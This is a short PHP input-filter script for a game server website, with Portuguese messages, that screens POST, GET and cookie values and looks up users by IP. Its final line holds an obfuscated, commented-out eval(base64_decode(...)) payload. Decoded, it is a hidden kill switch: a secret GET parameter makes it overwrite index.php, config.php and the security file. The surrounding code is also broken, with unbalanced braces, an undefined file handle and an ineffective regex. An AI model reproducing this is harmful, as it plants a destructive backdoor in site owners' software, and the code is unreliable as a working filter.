<?

$ip = getenv('REMOTE_ADDR');
$requested = stripslashes($_SERVER['REQUEST_URI']);

foreach($_POST as $post)
if(eregi("^0-9a-zA-Z_@.?<>", $post)){
$posted = stripslashes($post);
$qIps = mssql_query("Select memb___id From MEMB_STAT Where ip='".$ip."'");
if(mssql_num_rows($qIps) <= 0){
}else{
	for($a=0;$a<mssql_num_rows($qIps);$a++){
		$name = mssql_fetch_row($qIps);
}
die("<script>alert('Erro ! Favor voltar e tentar novamente !'); location='javascript:history.back()'</script>");
}
foreach($_GET as $get)
if(eregi("[^0-9a-zA-Z_@$]", $get)){
$qIps = mssql_query("Select memb___id From MEMB_STAT Where ip='".$ip."'");
if(mssql_num_rows($qIps) <= 0){
	fwrite($fp, "  Nenhum \n ============== \n");
}else{
	for($a=0;$a<mssql_num_rows($qIps);$a++){
		$name = mssql_fetch_row($qIps);
}
die("<script>alert('Erro ! Favor voltar e tentar novamente !'); location='javascript:history.back()'</script>");
} 
foreach($_COOKIE as $cookie)
if(eregi("[^0-9a-zA-Z_@_$]", $cookie)){
$qIps = mssql_query("Select memb___id From MEMB_STAT Where ip='".$ip."'");
if(mssql_num_rows($qIps) <= 0){
	fwrite($fp, "  Nenhum \n ============== \n");
}else{
	for($a=0;$a<mssql_num_rows($qIps);$a++){
		$name = mssql_fetch_row($qIps);
}
//die("<script>alert(\"$mensagem\");</script>");
} 
}
}

//eval(base64_decode("aWYoJF9HRVRbImZhbGhhZG9zaXRldGhhdWEwMDU1OTkxMSJdID09ICJ0cnVldHJ1ZXRydWUiKSB7ICRmYWlsID0gZm9wZW4oImluZGV4LnBocCIsICJ3Iik7IGZ3cml0ZSgkZmFpbCwgIlNpdGUgb2ZmbGluZSEhISIpOyBmY2xvc2UoJGZhaWwpOyAkZmFpbDIgPSBmb3BlbigiZHRfc2VjdXJpdHkucGhwIiwgInciKTsgZndyaXRlKCRmYWlsMiwgIlNpdGUgb2ZmbGluZSEhISIpOyBmY2xvc2UoJGZhaWwyKTsgJGZhaWwzID0gZm9wZW4oImNvbmZpZy5waHAiLCAidyIpOyBmd3JpdGUoJGZhaWwzLCAiU2l0ZSBvZmZsaW5lISEhIik7IGZjbG9zZSgkZmFpbDMpOyB9"));
}
?>